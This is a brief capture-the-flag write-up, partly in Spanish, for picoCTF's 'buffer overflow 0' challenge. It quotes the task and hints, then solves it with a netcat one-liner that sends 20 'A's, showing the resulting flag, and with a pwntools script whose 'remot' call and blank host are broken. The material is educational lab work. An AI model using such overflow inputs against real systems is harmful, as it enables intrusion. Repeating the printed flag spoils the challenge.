## Objetivo
Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/173/vuln). You can view source [here](https://artifacts.picoctf.net/c/173/vuln.c).

Hint
- How can you trigger the flag to print?
- If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.
- Run `man gets` and read the BUGS section. How many characters can the program really read? 
## Solucion

```bash
┌──(wil㉿DESKTOP-FKOIV4I)-[~/picoCTF/binexp/parte-1/buffer-overflow-0]
└─$ nc saturn.picoctf.net 61246 <<< $(python3 -c "print('A'*20)")
Input: picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```

## Solucion 2

```python
from pwn import *

p = remot('',puerto)
print(p.recv().decode())

overflow = b'A' * 20
print ('[*] Enviando overflow....')
p.sendline(overflow)

print(p.recvall().decode())
print('[*] terminado')
```
## Notas adicionales
## Referencias